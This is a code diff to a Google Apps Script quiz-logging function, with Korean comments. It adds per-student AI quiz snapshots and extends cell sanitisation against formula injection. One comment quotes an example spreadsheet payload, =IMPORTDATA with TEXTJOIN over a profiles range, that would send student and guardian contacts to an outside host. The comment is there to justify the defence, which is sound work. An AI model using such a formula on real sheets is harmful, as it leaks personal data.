@@ -768,6 +768,21 @@ function quizSweep_(ss) {
     qMap[String(r[0]).trim()] = { cat: String(r[2] || ''), q: parts[0] || '', a: parts.length > 1 ? parts.slice(1).join('|') : '' };
   });
 
+  /* [v9.188] 개인 퀴즈(AIQ-yyyy-MM-dd) 문항 스냅샷 — contents에 없고 **ai_daily에만** 있다.
+   *   여기서 안 담으면 문제·정답 칸이 영원히 빈 채로 남는다: 「무엇을 물었는지 모르는 답」은
+   *   3년차 봇 학습 재료가 되지 못한다(제품방향 §설계 불변식 2 — 원문 보존).
+   *   키에 sid를 함께 넣는 이유: 개인 퀴즈는 **학생마다 문제가 다르다**(contents 퀴즈는 전교 공용).
+   *   정답 칸은 "정답: X — 해설(몽골어)" 형식이라 접두어를 벗겨야 quizAnswerKeys_가 X를 키로 뽑는다.
+   * ⚠ 한계(정직하게): ai_daily는 오늘·어제만 들고 있어, 이틀 넘게 지연된 응답은 스냅샷이 빈다.
+   *   그때도 **응답 원문·퀴즈ID·날짜는 남고** 문항은 ai_daily_archive에 보존되므로 나중에 조인할 수 있다. */
+  const adQ = ss.getSheetByName('ai_daily');
+  if (adQ && adQ.getLastRow() >= 2) adQ.getRange(2, 1, adQ.getLastRow() - 1, 5).getValues().forEach(r => {
+    const sidA = String(r[0] || '').trim(), dA = String(r[1] || '').trim();
+    if (!sidA || !dA || !String(r[3] || '')) return;
+    qMap['AIQ-' + dA + '|' + sidA] = { cat: '개인퀴즈', q: String(r[3]),
+      a: String(r[4] || '').replace(/^\s*정답\s*[:：]\s*/, '') };
+  });
+
   const ql = ensureSheet(ss, 'quiz_log', QUIZ_LOG_HEADERS);
   헤더보정_(ql, QUIZ_LOG_HEADERS); // [v9.187] 이미 서 있는 11열 시트에 급수 이름표 — 없으면 새 칸이 조용히 버려진다
   const seen = {}; // '퀴즈ID|sid' — 같은 문항 재제출은 첫 답만 센다(고쳐 낸 답은 "무엇을 골랐나"를 오염시킨다)
@@ -787,15 +802,19 @@ function quizSweep_(ss) {
     const key = qid + '|' + sid;
     if (seen[key]) return;
     seen[key] = 1;
-    const meta = qMap[qid] || { cat: '', q: '', a: '' };
+    const meta = qMap[qid + '|' + sid] || qMap[qid] || { cat: '', q: '', a: '' }; // [v9.188] 개인 퀴즈는 (문항ID, 학생) 짝으로 찾는다
     const g = quizGrade_(ans, meta.a);
     /* 🔒 셀 수식 인젝션 차단 — 학생이 낸 답이 `=`로 시작하면 시트가 그것을 **수식으로 실행**한다.
      *   이 스프레드시트에는 profiles(학생·보호자 연락처)가 함께 있어,
      *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!B2:B60))` 한 줄로 개인정보가 외부로 나간다
      *   — 사람이 셀을 클릭할 필요도 없다(시트가 스스로 평가한다).
      *   상담AI가 페이스북 텍스트를 받으며 같은 이유로 셀안전_를 도입했다(v9.137) — 학생 입력도 남의 글이다. */
+    /* [v9.188] 문항 스냅샷 3칸에도 셀안전_ — 구 코드는 이 셋만 맨몸이었다(출처가 contents=우리 콘텐츠라서).
+     *   그런데 개인 퀴즈부터 출처가 **AI 생성물**이고, 그 재료는 학생의 약점 메모·첨삭이다
+     *   → 학생이 숙제에 `=IMPORTDATA(...)`를 써넣으면 약점 재료 → 프롬프트 → ai_daily → 여기로 흘러올 수 있다.
+     *   경로가 길다고 안 오는 것은 아니다. 값은 그대로 두고 선두 문자만 무력화하니 학습 재료도 안 상한다. */
     out.push(['QL' + Utilities.formatDate(ts, tz, 'yyyyMMdd') + '-' + sid + '-' + qid, sid, 셀안전_(qid),
-      meta.cat, meta.q, 셀안전_(ans), meta.a,
+      셀안전_(meta.cat), 셀안전_(meta.q), 셀안전_(ans), 셀안전_(meta.a),
       g.ok === null ? '판정보류' : (g.ok ? '정답' : '오답'), // 원칙: 판정 못 해도 행은 남는다
       셀안전_(conf), dstr(ts, tz), new Date(), lvOf[sid] || 0]); // [v9.187] 급수 스냅샷(0=미정)
   });
